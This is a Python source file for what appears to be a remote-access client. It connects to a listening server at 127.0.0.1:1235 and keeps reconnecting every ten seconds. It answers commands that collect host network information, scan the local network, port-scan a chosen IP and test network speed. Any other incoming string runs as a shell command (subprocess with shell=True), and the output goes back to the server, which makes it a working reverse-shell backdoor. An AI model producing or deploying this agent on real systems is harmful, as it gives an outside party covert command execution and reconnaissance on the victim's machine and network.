import os
import subprocess
from socket import *
from functions_manag import Data_1, Options, Portsanner_1
import time


#def is_valid_command(data):
 #   pass


while True:
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(("127.0.0.1", 1235))
        while True:
            data = client.recv(2048).decode()
            if data == "Information":# Running Funccia that checks information on the computer connecting to the server
                data_2 = Data_1()
                data_3 = data_2.Network_info()
                rr = ''.join(data_3)
                client.sendall(rr.encode(encoding='UTF-8'))
            elif data == "scanner":#Activating a function to scan the network
                data_2 = Options()
                data_3 = data_2.scanner_2()
                rr = ''.join(data_3)
                client.sendall(rr.encode(encoding='UTF-8'))
            elif data.startswith("ports|"):#The client receives an IP address and a range of parameters to scan
                _, target_ip, start_port, end_port = data.split("|")  # Filtering the arguments from the server
                end_port = int(end_port)
                start_port = int(start_port)
                scanner = Portsanner_1(target_ip, start_port, end_port)
                scanner.start_scan()  # Running the function with the arguments and getting the result
                rr = ''.join(scanner.data)
                client.sendall(rr.encode(encoding='UTF-8'))
            elif data == "speed":
                data_2 = Options()
                data_3 = data_2.run_speed()#Activating a function to test the network speed
                rr = ''.join(data_3)
                client.sendall(rr.encode(encoding='UTF-8'))
            else:
                try:#Receives a command to fix with error management
                    result = subprocess.run(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
                    error_message = f"Command failed with code {result.returncode}\n{result.stderr}"
                    if result.returncode != 0:
                        data = error_message
                    else:
                        data = result.stdout
                except Exception as e:
                    data = f"General error: {e}"
                client.sendall(data.encode(encoding='UTF-8'))

    except:
        print ("ממתין לחיבור...")
        time.sleep(10)
        continue

